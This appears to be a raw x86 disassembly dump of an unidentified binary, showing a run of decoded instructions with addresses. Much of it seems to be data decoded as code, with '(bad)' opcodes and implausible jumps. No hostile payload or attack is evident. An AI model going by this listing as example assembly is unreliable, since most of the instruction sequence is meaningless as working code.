  41ea87:	dec    edi
  41ea88:	cmp    eax,0x384f404f
  41ea8d:	dec    edi
  41ea8e:	xor    cl,BYTE PTR [edi+0x26]
  41ea91:	dec    edi
  41ea92:	push   ds
  41ea93:	rcr    BYTE PTR [edi],cl
  41ea95:	ror    DWORD PTR [edi],cl
  41ea97:	jecxz  0x41eaa5
  41ea99:	loopne 0x41eb17
  41ea9b:	lock jge 0x41ea8f
  41ea9e:	aas    
  41ea9f:	dec    edi
  41eaa0:	popa   
  41eaa1:	dec    edi
  41eaa2:	xor    cl,BYTE PTR [edi+0x5f]
  41eaa5:	dec    edi
  41eaa6:	xor    DWORD PTR [edi+0x42],ecx
  41eaa9:	dec    edi
  41eaaa:	ds dec edi
  41eaac:	xor    cl,BYTE PTR [edi+0x3f]
  41eaaf:	dec    edi
  41eab0:	push   ds
  41eab1:	loop   0x41ead2
  41eab3:	jecxz  0x41eac4
  41eab5:	repz or al,0xf0
  41eab8:	jl     0x41eaba
  41eaba:	jge    0x41eabd
  41eabc:	jl     0x41eace
  41eabe:	jge    0x41ead1
  41eac0:	ds dec edi
  41eac2:	jg     0x41eb13
  41eac4:	xor    cl,BYTE PTR [edi+0x5b]
  41eac7:	dec    edi
  41eac8:	xor    BYTE PTR [edi+0x62],cl
  41eacb:	dec    edi
  41eacc:	ds dec edi
  41eace:	inc    ecx
  41eacf:	dec    edi
  41ead0:	cmp    ecx,DWORD PTR [edi+0x32]
  41ead3:	dec    edi
  41ead4:	cmp    DWORD PTR [edi+0x1e],ecx
  41ead7:	add    bl,BYTE PTR [edi]
  41ead9:	add    ecx,DWORD PTR [edi]
  41eadb:	adc    ecx,DWORD PTR [eax+edx*1]
  41eade:	jl     0x41eb00
  41eae0:	jge    0x41eb03
  41eae2:	aas    
  41eae3:	dec    edi
  41eae4:	add    BYTE PTR [eax],al
  41eae6:	outs   dx,BYTE PTR ds:[esi]
  41eae7:	jmp    0xeba3eb2d
  41eaec:	inc    ecx
  41eaed:	add    BYTE PTR [edx-0x15],ch
  41eaf0:	inc    ecx
  41eaf1:	add    BYTE PTR [edx],ch
  41eaf3:	in     eax,dx
  41eaf4:	inc    ecx
  41eaf5:	add    BYTE PTR [esi+0x1a0041ec],cl
  41eafb:	in     eax,dx
  41eafc:	inc    ecx
  41eafd:	add    BYTE PTR [edx-0x15],cl
  41eb00:	inc    ecx
  41eb01:	add    BYTE PTR [esi-0x15],cl
  41eb04:	inc    ecx
  41eb05:	add    BYTE PTR [edx],dl
  41eb07:	in     eax,dx
  41eb08:	inc    ecx
  41eb09:	add    BYTE PTR [edx-0x4effbe15],dh
  41eb0f:	test   eax,0xbab8f89c
  41eb14:	pushf  
  41eb15:	clc    
  41eb16:	data16 jmp 0x41eb5a
  41eb19:	add    BYTE PTR [edx-0x14],cl
  41eb1c:	inc    ecx
  41eb1d:	add    BYTE PTR [esi-0x14],bl
  41eb20:	inc    ecx
  41eb21:	add    BYTE PTR [edx-0x14],ch
  41eb24:	inc    ecx
  41eb25:	add    BYTE PTR [edx-0x14],bh
  41eb28:	inc    ecx
  41eb29:	add    BYTE PTR [esi+0x6a0041eb],bl
  41eb2f:	jmp    0xebffeb75
  41eb34:	inc    ecx
  41eb35:	add    BYTE PTR [esi+0x2e0041eb],ch
  41eb3b:	in     eax,dx
  41eb3c:	inc    ecx
  41eb3d:	add    BYTE PTR [eax],bh
  41eb3f:	test   DWORD PTR [eax+edi*8-0x7ee8f463],ebx
  41eb46:	jb     0x41eb33
  41eb48:	inc    ecx
  41eb49:	add    BYTE PTR [edx-0x717ee9e4],bl
  41eb4f:	or     eax,0x705
  41eb54:	inc    eax
  41eb55:	add    BYTE PTR [ebp+ebx*8-0x6c],al
  41eb59:	fnsave [ebp+0x720042a9]
  41eb5f:	push   0xfa8e4145
  41eb64:	jne    0x41ebc8
  41eb66:	mov    gs,ebp
  41eb68:	inc    BYTE PTR [edi]
  41eb6a:	mov    edi,0x5a05a3fa
  41eb6f:	jmp    0x41ebb2
  41eb71:	add    BYTE PTR [ecx],bh
  41eb73:	xchg   ebp,eax
  41eb74:	pushf  
  41eb75:	clc    
  41eb76:	cmp    DWORD PTR [esi-0x6ac50764],edx
  41eb7c:	pushf  
  41eb7d:	clc    
  41eb7e:	cmp    edx,DWORD PTR [ebp-0x6ac30764]
  41eb84:	pushf  
  41eb85:	clc    
  41eb86:	cmp    eax,0x3ef89c95
  41eb8b:	xchg   ebp,eax
  41eb8c:	pushf  
  41eb8d:	clc    
  41eb8e:	aas    
  41eb8f:	xchg   ebp,eax
  41eb90:	pushf  
  41eb91:	clc    
  41eb92:	and    BYTE PTR [ebp-0x6ade0764],dl
  41eb98:	pushf  
  41eb99:	clc    
  41eb9a:	sub    BYTE PTR [ebp-0x6130764],dl
  41eba0:	add    esp,DWORD PTR [eax+0x62]
  41eba3:	jmp    0x74cbebe9
  41eba8:	inc    edx
  41eba9:	add    BYTE PTR [ecx+0x49],bl
  41ebac:	imul   di,WORD PTR [eax],0xff85
  41ebb0:	pushf  
  41ebb1:	clc    
  41ebb2:	popf   
  41ebb3:	jmp    0xb54f308
  41ebb8:	add    BYTE PTR [eax],al
  41ebba:	pop    esi
  41ebbb:	jmp    0xbdcec01
  41ebc0:	add    al,0xe
	...
  41ebf2:	add    BYTE PTR [eax],dl
  41ebf4:	inc    eax
  41ebf5:	add    BYTE PTR [esi+0x4284],ch
  41ebfb:	add    BYTE PTR [eax],al
  41ebfd:	add    BYTE PTR [ecx+0x0],cl
  41ec00:	inc    esp
  41ec01:	add    BYTE PTR [ecx+0x0],ch
  41ec04:	add    BYTE PTR fs:[ebx+0x0],cl
  41ec08:	dec    edx
  41ec09:	add    BYTE PTR [ebx+0x0],cl
  41ec0c:	dec    edx
  41ec0d:	add    BYTE PTR [eax+eax*1+0x6b],al
  41ec11:	add    BYTE PTR [eax+eax*1+0x6a],ch
  41ec15:	add    BYTE PTR [eax+eax*1+0x4c],al
  41ec19:	add    BYTE PTR [ecx+0x0],cl
  41ec1c:	inc    esp
  41ec1d:	add    BYTE PTR [eax+eax*1+0x49],cl
  41ec21:	add    BYTE PTR [ebp+0x0],dl
  41ec24:	dec    edx
  41ec25:	add    BYTE PTR [ebx+0x0],cl
  41ec28:	inc    esp
  41ec29:	add    BYTE PTR [eax+eax*1+0x4a],cl
  41ec2d:	add    BYTE PTR [ebx+0x0],cl
  41ec30:	dec    eax
  41ec31:	add    BYTE PTR [eax+eax*1+0x4a],al
  41ec35:	add    BYTE PTR [eax],al
  41ec37:	add    BYTE PTR [eax],al
  41ec39:	add    dh,bh
  41ec3b:	jmp    0x41ec7e
	...
  41ec45:	add    BYTE PTR [eax+0x59004191],bl
  41ec4b:	dec    edi
  41ec4c:	pop    edi
  41ec4d:	dec    edi
  41ec4e:	inc    eax
  41ec4f:	dec    edi
  41ec50:	inc    esp
  41ec51:	dec    edi
  41ec52:	pop    edi
  41ec53:	dec    edi
  41ec54:	inc    esi
  41ec55:	dec    edi
  41ec56:	add    DWORD PTR [edi+0x0],ecx
  41ec59:	dec    edi
  41ec5a:	xor    cl,BYTE PTR [edi+0x0]
  41ec5d:	add    BYTE PTR [ebp+0x4f],bl
  41ec60:	pop    esi
  41ec61:	dec    edi
  41ec62:	pop    ebx
  41ec63:	dec    edi
  41ec64:	add    DWORD PTR [edi+0x0],ecx
  41ec67:	dec    edi
  41ec68:	xor    cl,BYTE PTR [edi+0x4f]
  41ec6b:	dec    edi
  41ec6c:	inc    ecx
  41ec6d:	dec    edi
  41ec6e:	pop    edi
  41ec6f:	dec    edi
  41ec70:	inc    eax
  41ec71:	dec    edi
  41ec72:	add    DWORD PTR [edi+0x0],ecx
  41ec75:	dec    edi
  41ec76:	xor    cl,BYTE PTR [edi+0x0]
  41ec79:	add    BYTE PTR [ecx+0x4f],al
  41ec7c:	pop    edx
  41ec7d:	dec    edi
  41ec7e:	inc    esi
  41ec7f:	dec    edi
  41ec80:	dec    ebp
  41ec81:	dec    edi
  41ec82:	push   ebx
  41ec83:	dec    edi
  41ec84:	inc    edx
  41ec85:	dec    edi
  41ec86:	pop    ebx
  41ec87:	dec    edi
  41ec88:	xor    cl,BYTE PTR [edi+0x0]
  41ec8b:	add    BYTE PTR [eax],al
  41ec8d:	add    BYTE PTR [esi+0x7d],ch
  41ec90:	outs   dx,BYTE PTR ds:[esi]
  41ec91:	lea    ebp,[esi-0x63]
  41ec94:	outs   dx,BYTE PTR ds:[esi]
  41ec95:	lods   eax,DWORD PTR ds:[esi]
  41ec96:	outs   dx,BYTE PTR ds:[esi]
  41ec97:	mov    ebp,0xdd6ecd6e
  41ec9c:	outs   dx,BYTE PTR ds:[esi]
  41ec9d:	in     eax,dx
  41ec9e:	outs   dx,BYTE PTR ds:[esi]
  41ec9f:	std    
  41eca0:	outs   dx,BYTE PTR ds:[esi]
  41eca1:	or     eax,0x2d6e1d6e
  41eca6:	outs   dx,BYTE PTR ds:[esi]
  41eca7:	cmp    eax,0x6d6e5d6e
  41ecac:	outs   dx,BYTE PTR ds:[esi]
  41ecad:	jb     0x41ed1d
  41ecaf:	jae    0x41ed1f
  41ecb1:	jo     0x41ed21
  41ecb3:	jno    0x41ed23
  41ecb5:	jbe    0x41ed25
  41ecb7:	ja     0x41ed27
  41ecb9:	je     0x41ed29
  41ecbb:	jne    0x41ed2b
  41ecbd:	mov    ch,BYTE PTR [esi-0x75]
  41ecc0:	outs   dx,BYTE PTR ds:[esi]
  41ecc1:	mov    BYTE PTR [esi-0x77],ch
  41ecc4:	outs   dx,BYTE PTR ds:[esi]
  41ecc5:	mov    gs,WORD PTR [esi+0x7c]
  41ecc8:	pop    esi
  41ecc9:	jge    0x41ed19
  41eccb:	jge    0x41ec8b
  41eccd:	jge    0x41ed2b
  41eccf:	(bad)  
  41ecd0:	jge    0x41ed42
  41ecd2:	mov    ebp,0x71736eb1
  41ecd7:	bound  ebp,QWORD PTR [edx+0x70265fc6]
  41ecdd:	add    BYTE PTR [ebp+0x17],cl
  41ece0:	mov    ebx,0x4af4bd56
  41ece5:	aaa    
  41ece6:	dec    edx
  41ece7:	jle    0x41ec86
  41ece9:	jno    0x41ed3f
  41eceb:	mov    cl,0x8
  41eced:	imul   ebp,DWORD PTR [eax+ecx*1+0x58fd7d8],0x48
  41ecf5:	xlat   BYTE PTR ds:[ebx]
  41ecf6:	lds    edx,FWORD PTR [ebx+0x7dc4114c]
  41ecfc:	ret    
  41ecfd:	fidiv  WORD PTR [edi]
  41ecff:	into   
  41ed00:	mul    BYTE PTR [esi+0x1faa3204]
  41ed06:	push   0xc5c644f1
  41ed0b:	sbb    ch,al
  41ed0d:	jno    0x41ed0f
  41ed0f:	add    BYTE PTR [eax],al
  41ed11:	add    dh,ch
  41ed13:	(bad)  [ebx+0x7]
  41ed16:	mov    edx,0x450041eb
  41ed1b:	das    
  41ed1c:	shl    BYTE PTR [edx],0xb4
  41ed1f:	rol    BYTE PTR [ecx+0x0],1
  41ed22:	inc    esi
  41ed23:	push   ebx
  41ed24:	outs   dx,DWORD PTR ds:[esi]
  41ed25:	push   ebx
  41ed26:	push   edx
  41ed27:	jmp    0x41ed6a
  41ed29:	add    BYTE PTR [esi-0x71ffbe15],dh
  41ed2f:	in     eax,dx
  41ed30:	adc    al,BYTE PTR [edi]
  41ed32:	jae    0x41ed9d
  41ed34:	inc    edx
  41ed35:	jae    0x41ed9c
  41ed37:	popa   
  41ed38:	push   ecx
  41ed39:	pop    eax
  41ed3a:	pop    ecx
  41ed3b:	outs   dx,BYTE PTR ds:[esi]
  41ed3c:	jbe    0x41edb6
  41ed3e:	jns    0x41ed94
  41ed40:	push   ecx
  41ed41:	imul   ebp,DWORD PTR [ebx+0x74],0x78
  41ed45:	je     0x41edb6
  41ed47:	jns    0x41edb7
  41ed49:	popa   
  41ed4a:	push   esi
  41ed4b:	push   ebp
  41ed4c:	push   0x57564476
  41ed51:	dec    edx
  41ed52:	imul   edx,DWORD PTR [ebx+0x4b],0x78575065
  41ed59:	popa   
	...
  41ed6e:	jp     0x41edc4
  41ed70:	arpl   WORD PTR [ecx+0x4b],cx
  41ed73:	push   edx
  41ed74:	imul   ebp,DWORD PTR [eax+0x45],0x55487459
  41ed7b:	jp     0x41ede9
  41ed7d:	jb     0x41edd2
  41ed7f:	outs   dx,DWORD PTR ds:[esi]
  41ed80:	push   ebx
  41ed81:	inc    esi
  41ed82:	inc    edi
  41ed83:	push   0x66495949
  41ed88:	imul   ebx,DWORD PTR [edx+0x5a],0x5a
  41ed8c:	push   esi
  41ed8d:	jb     0x41edf7
  41ed8f:	add    BYTE PTR [ecx+0x43],ah
  41ed92:	push   ecx
  41ed93:	ins    BYTE PTR es:[edi],dx
  41ed94:	pop    eax
  41ed95:	ja     0x41ede4
  41ed97:	je     0x41ee0f
  41ed99:	bound  eax,QWORD PTR [ebx+eiz*2+0x0]
  41ed9d:	add    BYTE PTR [edi+0x56],dl
  41eda0:	push   esp
  41eda1:	dec    eax
  41eda2:	je     0x41edf0
  41eda4:	push   ebx
  41eda5:	jne    0x41ee12
  41eda7:	popa   
  41eda8:	jns    0x41edaa
  41edaa:	dec    edi
  41edab:	push   esp
  41edac:	dec    edi
  41edad:	dec    ebx
  41edae:	pop    edi
  41edaf:	pop    ebx
  41edb0:	dec    edi
  41edb1:	push   esp
  41edb2:	add    bl,BYTE PTR [esi]
  41edb4:	adc    ch,BYTE PTR ds:0x545833d6
  41edba:	push   eax
  41edbb:	jge    0x41edbe
  41edbd:	add    BYTE PTR [ecx+0x19000006],cl
  41edc3:	jnp    0x41ede1
  41edc5:	loope  0x41ee29
  41edc7:	ins    DWORD PTR es:[edi],dx
  41edc8:	sbb    DWORD PTR [eax-0x6d99b15d],ebx
  41edce:	outs   dx,BYTE PTR ds:[esi]
  41edcf:	scas   eax,DWORD PTR es:[edi]
  41edd0:	jbe    0x41ee37
  41edd2:	mov    esp,0x684146d8
  41edd7:	stc    
  41edd8:	test   eax,0x570a4d06
  41eddd:	stc    
  41edde:	xor    eax,0xcb77a862
  41ede3:	dec    eax
  41ede4:	ins    BYTE PTR es:[edi],dx
  41ede5:	push   esp
  41ede6:	push   esp
  41ede7:	fsubr  QWORD PTR [ebx]
  41ede9:	xor    DWORD PTR [ecx-0x34f3299b],ebp
  41edef:	push   ds
  41edf0:	push   0x78
  41edf2:	adc    BYTE PTR [edi+0x10],dh
  41edf5:	ret    0xd880
  41edf8:	ja     0x41ee40
  41edfa:	cli    
  41edfb:	ja     0x41eda7
  41edfd:	mov    al,ds:0x5d80ee3c
  41ee02:	test   DWORD PTR [esp+edi*8-0x47],esp
  41ee06:	or     al,0x75
  41ee08:	cdq    
  41ee09:	psubsw mm0,QWORD PTR [ebp+0x5316f466]
  41ee10:	inc    ebx
  41ee11:	rol    BYTE PTR [ebp-0x4266731a],1
  41ee17:	fisttp WORD PTR [edx+ebp*8+0x52f76aa5]
  41ee1e:	push   ds
  41ee1f:	in     al,0xbc
  41ee21:	das    
  41ee22:	enter  0x77d8,0xe8
  41ee26:	jns    0x41ee8b
  41ee28:	inc    eax
  41ee29:	sbb    BYTE PTR [esi-0x54],al
  41ee2c:	pusha  
  41ee2d:	je     0x41ede4
  41ee2f:	add    al,0xdd
  41ee31:	(bad)  
  41ee33:	loop   0x41ee83
  41ee35:	pop    es
  41ee36:	sbb    BYTE PTR [eax+0x46fa3c2a],0xc8
  41ee3d:	pop    eax
  41ee3e:	jne    0x41ee8c
  41ee40:	(bad)  
  41ee41:	pop    ebp
  41ee42:	or     al,0xb3
  41ee44:	sbb    BYTE PTR [edi],0x2
  41ee47:	sub    ebp,0x4dc630d6
  41ee4d:	sub    bh,BYTE PTR [ecx]
  41ee4f:	fs pop ebx
  41ee51:	push   cs
  41ee52:	lods   eax,DWORD PTR ds:[esi]
  41ee53:	ja     0x41ede5
  41ee55:	fisub  DWORD PTR [esi]
  41ee57:	das    
  41ee58:	mov    cl,BYTE PTR [esi+0x5b00e27a]
  41ee5e:	adc    al,0x18
  41ee60:	xchg   ebp,eax
  41ee61:	dec    edx
  41ee62:	adc    eax,DWORD PTR [edx]
  41ee64:	in     al,dx
  41ee65:	push   eax
  41ee66:	jl     0x41edee
  41ee68:	ins    DWORD PTR es:[edi],dx
  41ee69:	into   
  41ee6a:	loopne 0x41eed3
  41ee6c:	cld    
  41ee6d:	shr    ebx,0xf6
  41ee70:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ee71:	(bad)  
  41ee72:	jb     0x41edfd
  41ee74:	xchg   DWORD PTR [esi+0x1b4881c0],ecx
  41ee7a:	enter  0xf1f7,0x8b
  41ee7e:	jp     0x41ee28
  41ee80:	ror    edi,0x4e
  41ee83:	push   0xfffffffc
  41ee85:	rcr    BYTE PTR [edx],cl
  41ee87:	dec    ebx
  41ee88:	lods   al,BYTE PTR ds:[esi]
  41ee89:	cwde   
  41ee8a:	xor    eax,eax
  41ee8c:	daa    
  41ee8d:	ret    0xbd35
  41ee90:	mov    edi,0xe051bb72
  41ee95:	push   ecx
  41ee96:	bound  esi,QWORD PTR [ebx-0x65c171a8]
  41ee9c:	mov    eax,0x964740f1
  41eea2:	sbb    al,0xa
  41eea4:	cmp    DWORD PTR [ebx+0x2c37da6e],ebp
  41eeaa:	and    eax,0xaf5485cb
  41eeaf:	and    al,0x62
  41eeb1:	mov    cl,0xff
  41eeb3:	xchg   esp,eax
  41eeb4:	fcmovne st,st(5)
  41eeb6:	retf   0xa273
  41eeb9:	sbb    eax,DWORD PTR [esi+0x67]
  41eebc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41eebd:	leave  
  41eebe:	sar    DWORD PTR [ebp+ebx*8+0x73eca002],cl
  41eec5:	or     eax,0xb6f0bd07
  41eeca:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41eecb:	js     0x41eedc
  41eecd:	shl    ebx,cl
  41eecf:	xlat   BYTE PTR ds:[ebx]
  41eed0:	jge    0x41ef13
  41eed2:	jae    0x41eebe
  41eed4:	adc    DWORD PTR [esi+0x70],esi
  41eed7:	lahf   
  41eed8:	push   esp
  41eed9:	pop    eax
  41eeda:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41eedb:	in     eax,dx
  41eedc:	add    BYTE PTR [eax],0xa5
  41eedf:	mov    ds:0x95ec3fa2,al
  41eee4:	leave  
  41eee5:	dec    edx
  41eee6:	mov    ds:0xb8d194,al
  41eeeb:	sar    edx,1
  41eeed:	and    eax,0x27b13591
  41eef2:	out    0x30,eax
  41eef4:	pop    edi
  41eef5:	mov    edx,0xc3ad860b
  41eefa:	test   eax,0xa03da8a2
  41eeff:	pop    ebp
  41ef00:	dec    ebx
  41ef01:	xchg   edi,eax
  41ef02:	pop    eax
  41ef03:	loopne 0x41ef2f
  41ef05:	mov    ds:0x43d23c8,al
  41ef0a:	repz push esi
  41ef0c:	cld    
  41ef0d:	inc    esp
  41ef0e:	(bad)  
  41ef0f:	pop    edx
  41ef10:	shl    BYTE PTR [ecx+0x63],0x42
  41ef14:	out    dx,al
  41ef15:	and    dh,BYTE PTR [ebp+0x66a61596]
  41ef1b:	gs das 
  41ef1d:	inc    esp
  41ef1e:	in     al,dx
  41ef1f:	mov    ?,WORD PTR [ebx-0x49]
  41ef22:	outs   dx,BYTE PTR ds:[esi]
  41ef23:	push   ecx
  41ef25:	jns    0x41ef5c
  41ef27:	adc    esi,DWORD PTR [esp+eiz*8+0x2b]
  41ef2b:	jle    0x41ef1b
  41ef2d:	pop    esp
  41ef2e:	sbb    al,0x3e
  41ef30:	leave  
  41ef31:	adc    edx,DWORD PTR [ecx+0x3948d85c]
  41ef37:	lods   al,BYTE PTR ds:[esi]
  41ef38:	pop    ebp
  41ef39:	dec    edi
  41ef3a:	cld    
  41ef3b:	in     eax,dx
  41ef3c:	ja     0x41efad
  41ef3e:	inc    eax
  41ef3f:	inc    esi
  41ef40:	(bad)
  41ef44:	int    0x37
  41ef46:	mov    cl,0x95
  41ef48:	sbb    al,0x86
  41ef4a:	(bad)  
  41ef4b:	out    0x9,al
  41ef4d:	bound  ebx,QWORD PTR [ecx+0x76]
  41ef50:	iret   
  41ef51:	fs push edi
  41ef53:	and    al,0x83
  41ef55:	push   0x4a
  41ef57:	out    0xb6,al
  41ef59:	aam    0xbb
  41ef5b:	xchg   ebx,eax
  41ef5c:	jecxz  0x41ef8d
  41ef5e:	sub    bh,dh
  41ef60:	jae    0x41ef6a
  41ef62:	test   DWORD PTR [ebp+0x4ed46325],esi
  41ef68:	mov    ecx,0x4279e4c3
  41ef6d:	jmp    0xdc0b:0x8b9851c2
  41ef74:	inc    BYTE PTR [edi+0x54]
  41ef77:	test   eax,0x38a70aa0
  41ef7c:	arpl   WORD PTR [esi],ax
  41ef7e:	adc    BYTE PTR [esi+eax*4],ah
  41ef81:	dec    esp
  41ef82:	retf   
  41ef83:	sbb    al,0x81
  41ef85:	and    DWORD PTR [ecx+ebx*2-0x27],esp
  41ef89:	test   al,0xc1
  41ef8b:	addr16 sub ebx,0xadbd79a1
  41ef92:	sbb    eax,0x65b00465
  41ef97:	into   
  41ef98:	in     eax,0xcb
  41ef9a:	inc    ebp
  41ef9b:	call   0xf14f:0x83eb5239
  41efa2:	enter  0xbbe,0x61
  41efa6:	adc    BYTE PTR [esi-0x43],bh
  41efa9:	jle    0x41ef4e
  41efab:	je     0x41efba
  41efad:	into   
  41efae:	mov    ds:0xa0299a2,al
  41efb3:	fidiv  DWORD PTR [edx+0x78]
  41efb6:	xchg   DWORD PTR [ebx],eax
  41efb8:	mul    BYTE PTR ds:0x432b3eed
  41efbe:	mov    bh,0x4d
  41efc0:	popf   
  41efc1:	adc    ch,BYTE PTR [edi-0x6bad31e1]
  41efc7:	test   DWORD PTR [eax],edi
  41efc9:	mov    al,ds:0xad676a4d
  41efce:	mov    eax,ds:0xf46a5660
  41efd3:	stos   BYTE PTR es:[edi],al
  41efd4:	(bad)  
  41efd5:	adc    al,0x56
  41efd7:	cdq    
  41efd8:	in     al,dx
  41efd9:	arpl   WORD PTR [ebx-0x19f3766d],bx
  41efdf:	sub    esi,DWORD PTR [ebp+0x5f]
  41efe2:	not    ch
  41efe4:	fdivr  st(0),st
  41efe6:	ss mov edi,0x6f43782
  41efec:	sbb    al,0xfe
  41efee:	jb     0x41eff1
  41eff0:	mul    BYTE PTR [edi-0x7]
  41eff3:	imul   edx,DWORD PTR [esi+eiz*4+0x5b],0xffffffb4
  41eff8:	pop    ecx
  41eff9:	cmp    edi,DWORD PTR [esp+edi*4]
  41effc:	push   0xffffff95
  41effe:	mov    ds:0xf3350e1d,eax
  41f003:	dec    ebp
  41f004:	sbb    eax,0x421ef8ba
  41f009:	pop    edx
  41f00a:	popa   
  41f00b:	bound  esi,QWORD PTR [eax-0x79]
  41f00e:	nop
  41f00f:	xchg   edx,eax
  41f010:	ss push ss
  41f012:	mov    ebp,0x6a5c0228
  41f017:	sbb    ebx,DWORD PTR ds:0xb6f1e1c2
  41f01d:	dec    edi
  41f01e:	ror    DWORD PTR [eax],1
  41f020:	add    BYTE PTR [ebx-0xa7407e],dh
  41f026:	sub    BYTE PTR [edi],dh
  41f028:	adc    ebp,edx
  41f02a:	test   eax,0xf269b32f
  41f02f:	ror    DWORD PTR [ebx-0x750a2d20],cl
  41f035:	(bad)  
  41f036:	fstp   DWORD PTR [edx]
  41f038:	loope  0x41f09b
  41f03a:	sbb    al,0xaf
  41f03c:	hlt    
  41f03d:	mov    es,WORD PTR [ebx+0x7110cebf]
  41f043:	retf   0xb377
  41f046:	iret   
  41f047:	mov    esp,0x835c8d5b
  41f04c:	pop    ss
  41f04d:	jecxz  0x41f03e
  41f04f:	pushf  
  41f050:	test   al,0x33
  41f052:	(bad)  
  41f053:	cmp    edi,DWORD PTR [ebp+0x31542000]
  41f059:	cmp    DWORD PTR ds:0xb40745da,ebx
  41f05f:	dec    ebx
  41f060:	daa    
  41f061:	pusha  
  41f062:	std    
  41f063:	xor    ecx,0xffffff8a
  41f066:	adc    BYTE PTR [esi-0x117fd06a],al
  41f06c:	fld    st(7)
  41f06e:	pushf  
  41f06f:	les    edx,FWORD PTR [eax]
  41f071:	cmp    ebx,DWORD PTR [edx]
  41f073:	mov    ebx,0xb514abdd
  41f078:	sbb    bh,ch
  41f07a:	sbb    al,0xdf
  41f07c:	in     eax,dx
  41f07d:	sbb    ebx,0xd1e57410
  41f083:	dec    ebx
  41f084:	mov    ebp,0x2c7e21e0
  41f089:	repz cmp al,0x84
  41f08c:	fs xor edi,eax
  41f08f:	inc    edx
  41f090:	mov    eax,0x9bc40321
  41f095:	or     eax,0x9ca70b22
  41f09a:	loope  0x41f0aa
  41f09c:	cmp    dl,BYTE PTR [edi+0x2dec4128]
  41f0a2:	shr    BYTE PTR [edi],cl
  41f0a4:	dec    edi
  41f0a5:	mov    dh,0xf1
  41f0a7:	out    dx,eax
  41f0a8:	out    0x8e,al
  41f0aa:	sub    al,dl
  41f0ac:	cmc    
  41f0ad:	add    eax,0xf22f7ff2
  41f0b2:	pop    esi
  41f0b3:	sbb    BYTE PTR [eax],al
  41f0b5:	mov    ds:0x14cf5847,al
  41f0ba:	xchg   esp,eax
  41f0bb:	push   ds
  41f0bc:	jno    0x41f118
  41f0be:	call   0xa667:0x1c5b338d
  41f0c5:	sbb    BYTE PTR [eax-0x44c88a6],0x56
  41f0cc:	xchg   esp,eax
  41f0cd:	adc    BYTE PTR [edi+0x571efe16],dl
  41f0d3:	mov    WORD PTR [ecx],ss
  41f0d5:	mov    cs,WORD PTR [edi]
  41f0d7:	xchg   BYTE PTR [eax],dh
  41f0d9:	mov    esp,?
  41f0db:	int3   
  41f0dc:	int    0xc4
  41f0de:	lods   al,BYTE PTR ds:[esi]
  41f0df:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f0e0:	sub    bl,BYTE PTR [ebx+0x147114ec]
  41f0e6:	sbb    DWORD PTR fs:[ecx-0x6c],0xffffffac
  41f0eb:	data16 shl BYTE PTR [ebp-0x7e297d9d],0x7c
  41f0f3:	lods   al,BYTE PTR ds:[esi]
  41f0f4:	mov    dl,0x3e
  41f0f6:	cmp    dh,bh
  41f0f8:	mov    esi,DWORD PTR [edx-0x7]
  41f0fb:	sub    edx,DWORD PTR [ebx]
  41f0fd:	jo     0x41f133
  41f0ff:	and    al,0x21
  41f101:	mov    esi,0x3a4d3775
  41f106:	ret    
  41f107:	dec    ecx
  41f108:	ret    
  41f109:	mov    ds:0x2a582d7f,eax
  41f10e:	arpl   WORD PTR [ecx-0x1f],bx
  41f111:	fistp  QWORD PTR [ecx+0x77]
  41f114:	jp     0x41f0d4
  41f116:	jo     0x41f173
  41f118:	dec    esp
  41f119:	loopne 0x41f0f4
  41f11b:	sbb    BYTE PTR [ecx+0x243c1efd],ch
  41f121:	adc    ch,BYTE PTR [edi+0x3a]
  41f124:	xchg   ebp,eax
  41f125:	loopne 0x41f124
  41f127:	shl    DWORD PTR [ecx+0x4e95be89],0x68
  41f12e:	inc    esp
  41f12f:	mov    al,ds:0x2c9ede5b
  41f134:	sub    al,BYTE PTR [eax+0x4e1e9756]
  41f13a:	(bad)  
  41f13b:	out    0xa3,al
  41f13d:	aam    0x66
  41f13f:	mov    esi,0x60ebe3ca
  41f144:	mov    eax,0x22f0457f
  41f149:	and    BYTE PTR [ecx+0x3e],0x8
  41f14d:	(bad)  
  41f14e:	in     eax,dx
  41f14f:	iret   
  41f150:	pop    esp
  41f151:	xor    BYTE PTR [esi],bl
  41f153:	loopne 0x41f163
  41f155:	dec    ebx
  41f156:	shr    BYTE PTR ds:0x5e33d453,0xb
  41f15d:	add    ebp,ebx
  41f15f:	pop    ds
  41f160:	outs   dx,BYTE PTR ds:[esi]
  41f161:	push   cs
  41f162:	xchg   ebp,eax
  41f163:	out    dx,eax
  41f164:	pop    ecx
  41f165:	fchs   
  41f167:	imul   edi,DWORD PTR [ebx-0x26],0x2ef30e8b
  41f16e:	push   0xe5e0a711
  41f173:	xor    BYTE PTR [esi-0x6070f459],bl
  41f179:	xchg   dl,al
  41f17b:	mov    ch,0xac
  41f17d:	mov    ch,0xe7
  41f17f:	popa   
  41f180:	test   al,0x93
  41f182:	sbb    esp,esi
  41f184:	gs inc ecx
  41f186:	inc    eax
  41f187:	jmp    0x322e7202
  41f18c:	jno    0x41f202
  41f18e:	fcmovnbe st,st(2)
  41f190:	fwait
  41f191:	popf   
  41f192:	leave  
  41f193:	jge    0x41f186
  41f195:	ror    DWORD PTR [edx+0xa],1
  41f198:	ss out dx,al
  41f19a:	lods   al,BYTE PTR ds:[esi]
  41f19b:	and    esp,DWORD PTR [edi]
  41f19d:	xchg   dh,cl
  41f19f:	push   ds
  41f1a0:	lea    ecx,[edx+0x29c7c521]
  41f1a6:	aam    0xc9
  41f1a8:	addr16 mov al,ds:0x71f1
  41f1ac:	and    BYTE PTR [edx+edi*8],0xa7
  41f1b0:	sar    BYTE PTR [eax-0xdc25be9],0xec
  41f1b7:	or     al,0x77
  41f1b9:	fsub   st,st(0)
  41f1bb:	lea    esp,[eax]
  41f1bd:	add    al,0x3b
  41f1bf:	mov    WORD PTR [eax-0xa06da54],ds
  41f1c5:	mov    al,ds:0xe8d66685
  41f1ca:	adc    bl,BYTE PTR [ebx+0x42d403e3]
  41f1d0:	ds or  al,0xa4
  41f1d3:	jmp    0x308e0768
  41f1d8:	int    0x75
  41f1da:	cmp    BYTE PTR [edi],dl
  41f1dc:	sbb    ch,BYTE PTR [ecx+0x62]
  41f1df:	jecxz  0x41f183
  41f1e1:	dec    ecx
  41f1e2:	fs aam 0x9e
  41f1e5:	cmp    al,0x34
  41f1e7:	xchg   ebx,eax
